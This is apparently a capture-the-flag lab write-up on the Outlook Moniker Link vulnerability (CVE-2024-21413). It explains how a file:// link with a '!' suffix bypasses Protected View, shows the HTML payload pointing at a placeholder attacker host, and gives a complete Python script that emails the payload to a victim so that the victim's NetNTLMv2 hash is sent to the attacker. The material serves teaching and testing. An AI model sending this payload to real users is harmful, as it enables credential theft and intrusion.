# Moniker Link (CVE-2024-21413)

Outlook can render emails as HTML. You may notice this being used by your favourite newsletters. Additionally, Outlook can parse hyperlinks such as HTTP and HTTPS.
However, it can also open URLs specifying applications known as Moniker Links(opens in new tab). Normally, Outlook will prompt a security warning when external applications are triggered.

## Outlooks Protected View is triggered when launching an external application

This pop-up is a result of Outlook's "Protected View". Protected View opens emails containing attachments, hyperlinks and similar content in read-only mode,
blocking things such as macros (especially from outside an organisation). 

By using the file:// Moniker Link in our hyperlink, we can instruct Outlook to attempt to access a file,
such as a file on a network share (<a href="file://ATTACKER_IP/test">Click me</a>). The SMB protocol is used, which involves using local credentials for authentication.
However, Outlook's "Protected View" catches and blocks this attempt.

```
<p><a href="file://ATTACKER_MACHINE/test">Click me</a></p>
```

The vulnerability here exists by modifying our hyperlink to include the ```!``` special character and some text in our Moniker Link which results in bypassing Outlook’s Protected View.
For example: ```<a href="file://ATTACKER_IP/test!exploit">Click me</a>.```
```
<p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>
```
We, as attackers, can provide a Moniker Link of this nature for the attack. Note the share does not need to exist on the remote device, as an authentication attempt will be attempted regardless,
leading to the victim's Windows netNTLMv2 hash being sent to the attacker.

Remote Code Execution (RCE) is possible because Moniker Links uses the Component Object Model (COM) on Windows.
However, explaining this is currently out of scope for this room, as there is no publicly released proof of concept for achieving RCE via this specific CVE.

```
'''
Author: CMNatic | https://github.com/cmnatic
Version: 1.1 | 13/03/2024
Only run this on systems that you own or are explicitly authorised to test (in writing). Unauthorised scanning, testing or exploitation is illegal.
'''

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

sender_email = 'attacker@monikerlink.thm' # Replace with your sender email address
receiver_email = 'victim@monikerlink.thm' # Replace with the recipient email address
password = input("Enter your attacker email password: ")
html_content = """\
<!DOCTYPE html>
<html lang="en">
    <p><a href="file://ATTACKER_IP/test!exploit">Click me</a></p>

    </body>
</html>"""

message = MIMEMultipart()
message['Subject'] = "CVE-2024-21413"
message["From"] = formataddr(('CMNatic', sender_email))
message["To"] = receiver_email

# Convert the HTML string into bytes and attach it to the message object
msgHtml = MIMEText(html_content,'html')
message.attach(msgHtml)

server = smtplib.SMTP('MAILSVERIP', 25)
server.ehlo()
try:
    server.login(sender_email, password)
except Exception as err:
    print(err)
    exit(-1)

try:
    server.sendmail(sender_email, [receiver_email], message.as_string())
    print("\nEmail delivered")
except Exception as error:
    print(error)
finally:
    server.quit()
```

